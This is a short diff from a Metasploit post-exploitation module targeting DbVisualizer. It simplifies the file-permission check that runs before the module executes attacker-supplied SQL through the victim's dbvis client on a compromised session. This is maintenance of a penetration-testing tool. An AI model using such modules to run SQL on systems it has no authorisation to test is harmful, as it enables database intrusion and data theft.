@@ -198,14 +198,7 @@ class Metasploit3 < Msf::Post
     if file?(dbvis)==true
       can_exec = false
       f = session.fs.file.stat(dbvis)
-      if f.uid == Process.euid
-       can_exec = true
-      else
-       if Process.groups.include?f.gid
-         can_exec = true
-       end
-      end
-      if can_exec == true
+      if f.uid == Process.euid or Process.groups.include?f.gid
         print_status("Trying to execute evil sql, it can take time ...")
         args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
         dbvis ="\"#{dbvis}\""
